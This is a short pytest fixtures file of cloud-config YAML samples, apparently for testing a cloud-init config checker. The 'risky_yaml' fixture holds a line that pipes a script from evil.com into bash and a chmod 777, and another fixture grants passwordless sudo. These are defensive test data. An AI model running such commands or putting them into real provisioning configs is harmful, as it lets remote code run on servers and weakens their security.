import pytest

@pytest.fixture
def basic_yaml():
    return """
#cloud-config
packages:
  - nginx
  - git
runcmd:
  - systemctl restart nginx
"""

@pytest.fixture
def users_yaml():
    return """
#cloud-config
users:
  - name: ubuntu
    sudo: ALL=(ALL) NOPASSWD:ALL
    ssh_authorized_keys:
      - ssh-rsa AAAA... user@host
"""

@pytest.fixture
def risky_yaml():
    return """
#cloud-config
runcmd:
  - curl https://evil.com/install.sh | bash
  - chmod 777 /usr/bin/myapp
"""

@pytest.fixture
def invalid_yaml():
    return """
#cloud-config
packages:
  - nginx
  -
  invalid key
    badly: [indented
"""
